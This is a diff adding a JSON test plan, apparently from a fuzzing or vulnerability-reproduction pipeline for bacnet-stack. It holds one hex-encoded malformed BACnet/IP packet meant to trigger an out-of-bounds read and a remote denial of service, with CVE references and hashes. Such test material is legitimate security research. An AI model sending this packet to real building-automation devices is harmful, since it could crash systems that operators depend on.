@@ -1,0 +1,60 @@
+{
+  "plan_id": "vk-plan-025",
+  "seed_id": "vk-seed-001",
+  "title": "VK-only WriteProperty: In bacnet-stack 1.6.0-rc1, the official router-ipv6 application's r...",
+  "strategy": "issue_structural_analogue",
+  "target_operation": "WriteProperty",
+  "purpose": "Combine the issue-supported vulnerable structure with a conservative model-prior protocol form without copying the crash payload.",
+  "evidence_ids": [
+    "issue:cve-2026-62973:cve-2026-62973-summa:7487fbadc732",
+    "issue:cve-2026-41503:cve-2026-41503-summa:324815060097",
+    "issue:1304:1304-summary:e1e381ed7daa",
+    "issue:cve-2026-62974:cve-2026-62974-summa:f8b3896dc1cb",
+    "issue:1400:1400-summary:b9facce5d476",
+    "issue:cve-2026-58498:cve-2026-58498-summa:0998a9affbb6"
+  ],
+  "messages": [
+    {
+      "index": 0,
+      "direction": "client_to_server",
+      "label": "malformed_readpropm_ack",
+      "hex": "810a001e01010e010c400001193629013e0c0d40000119553c0200007b3f",
+      "byte_length": 30,
+      "sha256": "ed7c69a2ccbedbf9fb878bc12930ff7111c7c5c39b85c43126f3ccd128c1a91b"
+    }
+  ],
+  "expected_behavior": "Server-side decode path (rpm_ack_decode_service_request analogue) performs out-of-bounds read in bacnet_tag_number_decode() on invalid BOOLEAN tag; remote client-side DoS.",
+  "constraints_preserved": [
+    "BVLC length 0x0A consistent",
+    "NPDU/APDU 0x01 0x00 0x30 invoke_id",
+    "APDU context-specific tags",
+    "model-prior BACnet/IP layering",
+    "issue-supported trigger relation (malformed ACK property-value)",
+    "no external protocol document used"
+  ],
+  "issue_safety_notes": "Preserve only high-level malformed ACK structure from CVE-2026-62973 evidence; no exact crash bytes or payload copied; DoS analogue only.",
+  "sequence_sha256": "75fded845e3939c6cb3c4c27faa9c3f7262c015a86fa79845a9778e1e50a778c",
+  "total_bytes": 30,
+  "message_count_hint": 1,
+  "repair_notes": [],
+  "exact_issue_collision": false,
+  "plan_issue_refs": [
+    "CVE-2026-58498"
+  ],
+  "_selection_score": 109.0,
+  "export": {
+    "sequence_encoding": "raw-binary-concat",
+    "sequence_file": "sequence.bin",
+    "encoded_sha256": "ed7c69a2ccbedbf9fb878bc12930ff7111c7c5c39b85c43126f3ccd128c1a91b",
+    "encoded_bytes": 30,
+    "frames": [
+      {
+        "message_index": 0,
+        "frame_offset": 0,
+        "payload_offset": 0,
+        "payload_length": 30,
+        "frame_length": 30
+      }
+    ]
+  }
+}
